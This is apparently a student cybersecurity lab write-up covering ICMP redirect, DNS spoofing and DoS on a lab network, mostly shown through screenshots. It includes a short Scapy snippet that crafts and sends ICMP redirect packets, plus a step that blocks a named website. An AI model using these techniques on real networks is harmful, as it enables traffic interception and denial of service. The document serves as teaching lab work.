## ICMP Redirect:

```Victim Machine 10.211.56.5```

```Attacker Machine 10.211.56.4```

Add Victim IP to target 1
Add Gateway to target 2

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/71ab3471-1e49-4c52-85ca-34f939e9a20c">


<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/a3e2f08b-c3ca-49f0-9566-3335fd0019fd">

ICMP Redirect:

<img width="1281" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/868299bb-82e2-4044-99df-0d1e2e974e09">

<img width="1301" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/9ebdb335-4a13-4c4e-a3b3-64b009eb7883">


ICMP_redirect python code


from scapy.all import *

Craft ICMP Redirect packet
icmp_redirect = Ether() / IP(dst="victim_ip") / ICMP(type=5, code=1, gw="gateway_ip")

Send ICMP Redirect packet
sendp(icmp_redirect, iface="your_network_interface")

<img width="844" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/b1457468-e692-48b3-b56e-77e3746cbc94">


ICMP Redirect capture in wireshark

<img width="1285" alt="image" src="https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/cbd98731-bf75-4ee2-b415-a74893ff4cb3">

DNS Spoofing

![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/529ed7b9-9229-4543-8a1a-a9fcb2e4fc7f)

![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/cbca4c02-5b43-400e-bb30-928cffc213b7)

![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/97f01474-c45c-4326-a7cf-2026b536a85c)

Dos Spoofing

Start dos_attack extension, then we can see that packets are also redirected and www.amrita.edu website will not be loaded


![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/0c3e0108-ab18-43ea-b7d3-b573e2b1eee5)


![image](https://github.com/SantoshKumarP1412/Cybersecurity-Lab/assets/140537888/b2644e38-bcc4-413c-8985-9c71d55bbf56)
